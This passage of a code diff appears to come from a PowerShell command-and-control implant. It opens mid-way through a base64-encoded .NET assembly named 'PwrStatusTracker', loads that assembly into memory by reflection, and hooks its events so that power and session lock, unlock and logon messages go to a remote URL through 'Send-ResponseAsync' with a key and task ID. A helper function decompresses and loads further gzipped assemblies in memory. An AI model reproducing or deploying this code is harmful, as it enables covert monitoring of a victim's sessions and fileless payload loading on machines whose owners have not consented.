lAWkBpgGqAQQAAQAAACcNWQADAAEABAACAAUAAwAAAEUEqwIAAHAErwIAACQNswIAAFoLuAIAAIgLvQIIAAkAAgAQAAoAAgACAAYAAwABAAcAAwACAA0ABQACABIABwABABMABwACABQACQABABUACQACABsACwBwCFYISQg5AGMIOwBAAQUA+AkBAAABBwDaDAEAQAEJAFYDAQBAAS0AhwkCAAABLwCmCQMAQAMxAEMJBAAAAzMAZAkEAAABNQAYDAUABIAAAAEAAAAAAAAAAAAAAAAAPAoAAAIAAAAAAAAAAAAAALABMwMAAAAAAgAAAAAAAAAAAAAAsAGVCwAAAAACAAAAAAAAAAAAAACwAeQIAAAAAAIAAAAAAAAAAAAAALkB5gcAAAAABgACAAcABQAIAAUACQAFAAoABQBBAJQAAAAAPD5jX19EaXNwbGF5Q2xhc3MxXzAAPENyZWF0ZVB3ckZybUFzeW5jPmJfXzAATnVsbGFibGVgMQBVc2VyMzIAVG9JbnQzMgBtZXNzYWdlMgA8TW9kdWxlPgBTRVNTSU9OX0xPQ0tfVUFDAFBCVF9BUE1SRVNVTUVTVVNQRU5EAFBCVF9BUE1TVVNQRU5EAFBCVF9BUE1RVUVSWVNVU1BFTkQAR1VJRF9BQ0RDX1BPV0VSX1NPVVJDRQBHVUlEX1NZU1RFTV9BV0FZTU9ERQBQQlRfUE9XRVJTRVRUSU5HQ0hBTkdFAFBCVF9BUE1QT1dFUlNUQVRVU0NIQU5HRQBXTV9XVFNTRVNTSU9OX0NIQU5HRQBERVZJQ0VfTk9USUZZX1dJTkRPV19IQU5ETEUARU5EU0VTU0lPTl9MT0dPRkYAV1RTX1NFU1NJT05fTE9HT0ZGAFNpemVGAEdVSURfQkFUVEVSWV9QRVJDRU5UQUdFX1JFTUFJTklORwBQT1dFUkJST0FEQ0FTVF9TRVRUSU5HAFdUU19TRVNTSU9OX1VOTE9DSwBXVFNfU0VTU0lPTl9MT0NLAFNFU1NJT05fTk9UX0xPQ0sARU5EU0VTU0lPTl9DUklUSUNBTABXVFNfU0VTU0lPTl9SRU1PVEVfQ09OVFJPTABXVFNfU0VTU0lPTl9MT0dPTgBXTV9RVUVSWUVORFNFU1NJT04AV01fRU5EU0VTU0lPTgBOT1RJRllfRk9SX1RISVNfU0VTU0lPTgBHVUlEX01PTklUT1JfUE9XRVJfT04ARU5EU0VTU0lPTl9DTE9TRUFQUABUaHJvd0V4Y2VwdGlvbkZvckhSAEdVSURfUE9XRVJfU0FWSU5HX1NUQVRVUwBTWVNURU1fUE9XRVJfU1RBVFVTAFdUU19DT05TT0xFX0RJU0NPTk5FQ1QAV1RTX1JFTU9URV9ESVNDT05ORUNUAFdUU19DT05TT0xFX0NPTk5FQ1QAV1RTX1JFTU9URV9DT05ORUNUAFdNX1BPV0VSQlJPQURDQVNUAFBCVF9BUE1CQVRURVJZTE9XAHZhbHVlX18ARGF0YQBtc2NvcmxpYgBDcmVhdGVQd3JGcm1Bc3luYwBXbmRQcm9jAEdldFdpbmRvd1RocmVhZFByb2Nlc3NJZABscGR3UHJvY2Vzc0lkAEdldFByb2Nlc3NCeUlkAEhpZGRlbkZvcm1fTG9hZABJbnRlcmxvY2tlZABPbkhhbmRsZURlc3Ryb3llZABQb3dlclNldHRpbmdHdWlkADxNZXNzYWdlPmtfX0JhY2tpbmdGaWVsZAA8TWVzc2FnZXM+a19fQmFja2luZ0ZpZWxkADxQd3JOb3RpZnk+a19fQmFja2luZ0ZpZWxkAGhXbmQASGlkZQBzZXRfQXV0b1NjYWxlTW9kZQBnZXRfTWVzc2FnZQBzZXRfTWVzc2FnZQBtZXNzYWdlAENvbXBhcmVFeGNoYW5nZQBJbnZva2UAZ2V0X0lzTm90aWZpYWJsZQBJRGlzcG9zYWJsZQBnZXRfSGFuZGxlAFJ1bnRpbWVUeXBlSGFuZGxlAEdldFR5cGVGcm9tSGFuZGxlAGhhbmRsZQBDb25zb2xlAHNldF9Gb3JtQm9yZGVyU3R5bGUAZ2V0X0V4U3R5bGUAc2V0X0V4U3R5bGUAc2V0X05hbWUAZ2V0X1Byb2Nlc3NOYW1lAEdldE5hbWUAQmF0dGVyeUZ1bGxMaWZlVGltZQBCYXR0ZXJ5TGlmZVRpbWUAQXBwZW5kTGluZQBXcml0ZUxpbmUAQ29tYmluZQBWYWx1ZVR5cGUAU2V0VmlzaWJsZUNvcmUAUHRyVG9TdHJ1Y3R1cmUARGlzcG9zZQBEZWxlZ2F0ZQBEZWJ1Z2dlckJyb3dzYWJsZVN0YXRlAHNldF9XaW5kb3dTdGF0ZQBGb3JtV2luZG93U3RhdGUAc3RhdGUAU1RBVGhyZWFkQXR0cmlidXRlAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBEZWJ1Z2dlckJyb3dzYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0ZQBnZXRfSGFzVmFsdWUAdmFsdWUAUmVtb3ZlAHNldF9DbGllbnRTaXplAFN5c3RlbVN0YXR1c0ZsYWcAQmF0dGVyeUZsYWcAU3lzdGVtLlRocmVhZGluZwBUb1N0cmluZwBTdWJzdHJpbmcAZGlzcG9zaW5nAFBvd2VyU2V0dGluZwBTeXN0ZW0uRHJhd2luZwBnZXRfTXNnAEdldE1zZwBtc2cARGF0YUxlbmd0aABTdGFydHNXaXRoAFdhaXRDYWxsYmFjawBNYXJzaGFsAFN5c3RlbS5Db21wb25lbnRNb2RlbABXdHNBcGkzMi5kbGwAd3RzYXBpMzIuZGxsAGtlcm5lbDMyLmRsbAB1c2VyMzIuZGxsAFB3clN0YXR1c1RyYWNrZXIuZGxsAFRocmVhZFBvb2wAQ29udGFpbmVyQ29udHJvbABnZXRfTFBhcmFtAGdldF9XUGFyYW0AbHBhcmFtAFF1ZXVlVXNlcldvcmtJdGVtAE9wZXJhdGluZ1N5c3RlbQBUcmltAENyZWF0ZVB3ckZybQBwZnJtAEZvcm0ARW51bQBUaW1lU3BhbgBnZXRfT1NWZXJzaW9uAGdldF9WZXJzaW9uAFRyYW5zbGF0ZUVuZFNlc3Npb24AUmVnaXN0ZXJQb3dlclNldHRpbmdOb3RpZmljYXRpb24AVW5yZWdpc3RlclBvd2VyU2V0dGluZ05vdGlmaWNhdGlvbgBXVFNSZWdpc3RlclNlc3Npb25Ob3RpZmljYXRpb24AV1RTVW5SZWdpc3RlclNlc3Npb25Ob3RpZmljYXRpb24AQXBwbGljYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ARXhjZXB0aW9uAFJ1bgBaZXJvAE9wZW5JbnB1dERlc2t0b3AAc2V0X1Nob3dJblRhc2tiYXIAU3RyaW5nQnVpbGRlcgBzZW5kZXIAUHdyTm90aWZpZXIAUHdyU3RhdHVzVHJhY2tlcgBMb2NrQ2hlY2tlcgBFdmVudEhhbmRsZXIASUNvbnRhaW5lcgBUb0xvd2VyAGxwUG93ZXIAZ2V0X01ham9yAEdldExhc3RXaW4zMkVycm9yAC5jdG9yAC5jY3RvcgBfaG1vbml0b3IASW50UHRyAHB3cgBTeXN0ZW0uRGlhZ25vc3RpY3MAZ2V0X1NlY29uZHMARnJvbVNlY29uZHMAZ2V0X01pbGxpc2Vjb25kcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBnZXRfTWVzc2FnZXMAc2V0X01lc3NhZ2VzAGdldF9NaW51dGVzAGR3RmxhZ3MAUHdyRXZlbnRBcmdzAGdldF9DcmVhdGVQYXJhbXMAU3lzdGVtLldpbmRvd3MuRm9ybXMAc2V0X0F1dG9TY2FsZURpbWVuc2lvbnMAZ2V0X0hvdXJzAGR3RGVzaXJlZEFjY2VzcwBQcm9jZXNzAGNvbXBvbmVudHMAQUNMaW5lU3RhdHVzAEdldExvY2tTdGF0dXMAU2Vzc2lvblN0YXR1cwBHZXRTeXN0ZW1Qb3dlclN0YXR1cwBHZXRQb3dlclN0YXR1cwBDb25jYXQARm9ybWF0AE9iamVjdABmSW5oZXJpdABHZXRWYWx1ZU9yRGVmYXVsdABCYXR0ZXJ5TGlmZVBlcmNlbnQAaFJlY2lwaWVudABFbnZpcm9ubWVudABJbml0aWFsaXplQ29tcG9uZW50AFN1c3BlbmRMYXlvdXQAUmVzdW1lTGF5b3V0AFN5c3RlbS5UZXh0AHNldF9UZXh0AEdldEZvcmVncm91bmRXaW5kb3cAYWRkX05vdGlmeQByZW1vdmVfTm90aWZ5AENhbGxOb3RpZnkAZ2V0X1B3ck5vdGlmeQBzZXRfUHdyTm90aWZ5AG9wX0VxdWFsaXR5AElzTnVsbE9yRW1wdHkAAA9sAG8AYwBrAGEAcABwAAAxVwBNAF8AVwBUAFMAUwBFAFMAUwBJAE8ATgBfAEMASABBAE4ARwBFADoAewAwAH0AAAEAQUcAVQBJAEQAXwBBAEMARABDAF8AUABPAFcARQBSAF8AUwBPAFUAUgBDAEUAOgBVAG4AcABsAHUAZwBnAGUAZAAAV0QASQBTAEMASABBAFIARwBFADoAIAB7ADAAOgBEADIAfQBoADoAewAxADoARAAyAH0AbQA6AHsAMgA6AEQAMgB9AHMAOgB7ADMAOgBEADMAfQBtAHMAAD1HAFUASQBEAF8AQQBDAEQAQwBfAFAATwBXAEUAUgBfAFMATwBVAFIAQwBFADoAUABsAHUAZwBnAGUAZAAAPUcAVQBJAEQAXwBBAEMARABDAF8AUABPAFcARQBSAF8AUwBPAFUAUgBDAEUAOgBVAG4AawBuAG8AdwBuAAAJSABJAEcASAAAB0wATwBXAAARQwBSAEkAVABJAEMAQQBMAAAJTgBPAE4ARQAAD1UATgBLAE4ATwBXAE4AABdCAEEAVABUAEUAUgBZADoAewAwAH0AABtDAEgAUgBHADoAQwBIAEEAUgBHAEkATgBHAAAhQwBIAFIARwA6AEQASQBTAEMASABBAFIARwBJAE4ARwAAH1AARQBSAEMARQBOAFQAOgBVAE4ASwBOAE8AVwBOAAAXUABFAFIAQwBFAE4AVAA6AHsAMAB9AAAnRQBOAEQAUwBFAFMAUwBJAE8ATgBfAFMASABVAFQARABPAFcATgAAJ0UATgBEAFMARQBTAFMASQBPAE4AXwBDAEwATwBTAEUAQQBQAFAAACdFAE4ARABTAEUAUwBTAEkATwBOAF8AQwBSAEkAVABJAEMAQQBMAAAjRQBOAEQAUwBFAFMAUwBJAE8ATgBfAEwATwBHAE8ARgBGAAAnVwBNAF8AUQBVAEUAUgBZAEUATgBEAFMARQBTAFMASQBPAE4AOgAAHVcATQBfAEUATgBEAFMARQBTAFMASQBPAE4AOgAAJVcATQBfAFAATwBXAEUAUgBCAFIATwBBAEQAQwBBAFMAVAA6AAAzRwBVAEkARABfAE0ATwBOAEkAVABPAFIAXwBQAE8AVwBFAFIAXwBPAE4AOgBPAEYARgAAMUcAVQBJAEQAXwBNAE8ATgBJAFQATwBSAF8AUABPAFcARQBSAF8ATwBOADoATwBuAABLRwBVAEkARABfAEIAQQBUAFQARQBSAFkAXwBQAEUAUgBDAEUATgBUAEEARwBFAF8AUgBFAE0AQQBJAE4ASQBOAEcAOgB7ADAAfQAANUcAVQBJAEQAXwBBAEMARABDAF8AUABPAFcARQBSAF8AUwBPAFUAUgBDAEUAOgBVAFAAUwAAI1AAQgBUAF8AQQBQAE0AQgBBAFQAVABFAFIAWQBMAE8AVwAAJ1AAQgBUAF8AQQBQAE0AUQBVAEUAUgBZAFMAVQBTAFAARQBOAEQAAB1QAEIAVABfAEEAUABNAFMAVQBTAFAARQBOAEQAAClQAEIAVABfAEEAUABNAFIARQBTAFUATQBFAFMAVQBTAFAARQBOAEQAAD1QAEIAVABfAEEAUABNAFAATwBXAEUAUgBTAFQAQQBUAFUAUwBDAEgAQQBOAEcARQA6AA0ACgB7ADAAfQAASTAAMgA3ADMAMQAwADEANQAtADQANQAxADAALQA0ADUAMgA2AC0AOQA5AGUANgAtAGUANQBhADEANwBlAGIAZAAxAGEAZQBhAAFJYQA3AGEAZAA4ADAANAAxAC0AYgA0ADUAYQAtADQAYwBhAGUALQA4ADcAYQAzAC0AZQBlAGMAYgBiADQANgA4AGEAOQBlADEAAUlFADAAMAA5ADUAOABDADAALQBDADIAMQAzAC0ANABBAEMARQAtAEEAQwA3ADcALQBGAEUAQwBDAEUARAAyAEUARQBFAEEANQABSTkAOABhADcAZgA1ADgAMAAtADAAMQBmADcALQA0ADgAYQBhAC0AOQBjADAAZgAtADQANAAzADUAMgBjADIAOQBlADUAQwAwAAFJNQBkADMAZQA5AGEANQA5AC0AZQA5AEQANQAtADQAYgAwADAALQBhADYAYgBkAC0AZgBmADMANABmAGYANQAxADYANQA0ADgAAQB/JHbAhGWRQrGMAuKFzlJFAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIFIAEBEVE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"
+                $dllbytes  = [System.Convert]::FromBase64String($ps)
+                $asm = [System.Reflection.Assembly]::Load($dllbytes)
+                $PwrStatus["initd"] = $true
+                $t=$asm.GetType("PwrStatusTracker.PwrFrm")
+                $tpwn=$asm.GetType("PwrStatusTracker.PwrNotifier")
+                $pwnr=[System.Activator]::CreateInstance($tpwn)
+                $PwrStatus["evntId"] = "pwrFrm"+ ([System.Guid]::NewGuid()).ToString()
+                $global:callback=${function:sendPwrResponse}
+                $global:callback.Invoke("Power Status Monitoring: Enabled")
+                Register-ObjectEvent -InputObject $pwnr -EventName Notify -SourceIdentifier ($PwrStatus["evntId"]) -Action {
+                    try
+                    {
+                        #$global:callback.Invoke($Event.SourceArgs.Message)
+                        #$global:callback.Invoke($pwnr.GetMsg)
+                        #$global:callback.Invoke($pwnr.GetMsg())
+                        #$global:callback.Invoke($pwnr.message
+                        if (($Event -ne $null) -and ($Event.SourceArgs -ne $null) -and !([String]::IsNullOrEmpty($Event.SourceArgs.Message)))
+                        {
+                            $global:callback.Invoke($Event.SourceArgs.Message)
+                        }
+                    }
+                    catch {}
+                } | out-null
+                $m=$t.GetMethod("CreatePwrFrmAsync")
+                $pfrm=$m.Invoke($null, ($pwnr))
+        }
+    } else {
+        write-output "Already running"
+    }
+}
+
+$script:genurl=${function:GenerateURL}
+$script:sendresp=${function:Send-ResponseAsync}
+$script:sendrespkey=${variable:key}
+function sendPwrResponse
+{
+    param([String]$message)
+    $pwrurl=$script:genurl.Invoke()
+    $script:sendresp.Invoke($pwrurl, $script:sendrespkey, "$($script:PwrStatus['taskId'].ToString())-pwrstatusmsg", $message)
+}
+
+function loadCompressedAsm()
+{
+    Param ( [string]$cmpdAsm )
+    try
+    {
+        $Delay = $Delay *1000
+        if (![String]::IsNullOrEmpty($cmpdAsm))
+        {
+            [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream(45000)
+            [System.IO.MemoryStream] $gzdll = New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String($cmpdAsm))
+            $gzipStream = New-Object System.IO.Compression.GzipStream $gzdll, ([IO.Compression.CompressionMode]::Decompress)
+            try
+            {
+                $buffer = New-Object byte[](32000);
+                while($true)
+                {
+                    $read=$gzipStream.Read($buffer, 0, 32000)
+                    if($read -le 0) {break}
+                    $output.Write($buffer, 0, $read)
+                }
+            }
+            finally
+            {
+                $gzipStream.Close()
+                $output.Close()
+                $gzdll.Close()
+            }
+            return [System.Reflection.Assembly]::Load($output.ToArray());
+        }
+        else
+        {
+            return $null;
+        }
+    }
+    catch
+    {
+        return $null;
+    }
 }
